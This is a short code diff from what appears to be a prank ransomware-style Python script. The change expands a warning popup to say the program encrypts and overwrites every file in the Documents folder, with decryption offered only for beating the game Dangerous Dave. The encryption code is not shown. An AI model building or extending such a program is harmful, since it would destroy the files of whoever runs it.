@@ -13,10 +13,10 @@ KEY_FILE = "secret.key"
 
 # warning(s) with sound
 def run_warnings():
-    # Play Windows Error sound for each popup
+ 
     winsound.MessageBeep(winsound.MB_ICONHAND)
     choice1 = pymsgbox.confirm(
-        text="Warning! This is a virus. Please do not run this on your computer, if you run it I am not liable for any damages!!!!",
+        text="Warning! This is a virus. Please do not run this on your computer, This program will encrypt all files in your Documents folder and overwrite them, the only way to decrypt all of your files is if you win the OG dangerous dave game! if you run it I am not liable for any damages!!!!",
         title="CRITICAL WARNING",
         buttons=['Continue', 'Quit']
     )
